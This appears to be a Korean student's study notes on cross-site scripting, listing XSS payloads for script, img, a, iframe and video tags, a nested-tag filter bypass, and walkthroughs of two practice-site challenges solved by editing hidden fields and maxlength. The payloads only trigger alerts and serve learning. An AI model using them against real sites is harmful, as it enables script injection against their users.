## XSS에 이용되는 대표적인 태그 5가지

1. 가장 기본적인 태그 : \<script\>\</script\><br>
    1-1 script 태그를 일차적으로 필터링하는 것을 우회하는 법 : <scr<script>ipt>alert("xss");</scr</script>ipt>
2. HTML 태그1 이미지 태그 : \<img\><br>
    2-1 예제 : \<img src="x" onerror=alert(1)\><br>
        예제2 : \<img src="javascript:alert(1)"\>
3. HTML 태그2 하이퍼링크 태그 : \<a\>\</a\><br>
    3-1 예제 : \<a href="javascript:alert(1)"\>xss\</a\><br>
        예제2 : \<a onmouseover=alert(1)\>xss\</a\>
4. HTML 태그3 iframe 태그 : <iframe></iframe><br>
4-1 예제 : <iframe src="javascript:alert(1)" width="0" height="0"></iframe>
5. HTML 태그4 video 태그 : \<video\>\</video\><br>
5-1 예제 : \<video oncanplay=alert(1)\>\<source src="validvideo.mp4" type="video/mp4"\>\</video\>
  
## How to work out XSS
   간단하게 말해 사용자의 입력값을 웹 페이지에서 보여줄 수 있을 때 발생한다.<br>그 방법이 서버에 저장되었다가 사용자의 요청이 들어왔을 때 해당 입력값을 reply해주면 stored-xss인거고, 
  사용자의 입력에 대해서 바로 reply하면 reflected-xss인 것이다. Reflected-xss는 보통 악성 URL을 통해 시작된다. Reflected-xss는 사용자가 요청한 데이터에 악성 스크립트를 더해 reply하기 때문에 사회공학적 기법을 섞어 데이터를 요청하도록 유도해야한다.
  
## XSS Challenge 4번(http://xss-quiz.int21h.jp/)
사실 이 challenge에는 크나큰 버그가 존재한다. 그건 바로 console에서 alert시키면 문제가 통과된다는 점이다ㅋㅋ 암튼 제대로 풀어보자<br><br>
  ![image](https://user-images.githubusercontent.com/92368528/137503031-58721564-9237-4e18-95c6-1d36bcaf8581.png)<br>
  3번과 같은 방법으로는 안풀린다.<br>
  힌트를 살짝 보니 보이지 않는 field가 있어서 페이지 소스를 보니 p3이 있었다. 그래서 hidden을 살짝 지우고 해당 값에 XSS 공격을 하니 성공했다.<br>
  ![image](https://user-images.githubusercontent.com/92368528/137504117-65af926f-9955-4086-9f30-eb5af67fa03f.png)<br>
  
  ## XSS Challenge 5번(http://xss-quiz.int21h.jp/)
![image](https://user-images.githubusercontent.com/92368528/137504626-46f2cb58-1d15-4864-8a7e-04359ebcc0dd.png)<br>
 p1에 maxlength가 15인데 우리가 공격할 구문은 \<script\>alert(document.domain);\</script\> 으로 40자이다. maxlength를 건드리거나, 공격구문을 간소화시켜 XSS를 성공시켜보자. <br>
  ![image](https://user-images.githubusercontent.com/92368528/137504980-25e6b04f-3e1c-4de6-9f71-7699fe7f1a81.png)<br>
 maxlength를 지우고 XSS 공격을 하였더니 성공하였다.<br><br>
  
왠지 소스 안건들이고 풀 수도 있을거 같은데, 소스를 안건들이고 4, 5번은 풀 수 있나 추후에 고민해봐야겠다.


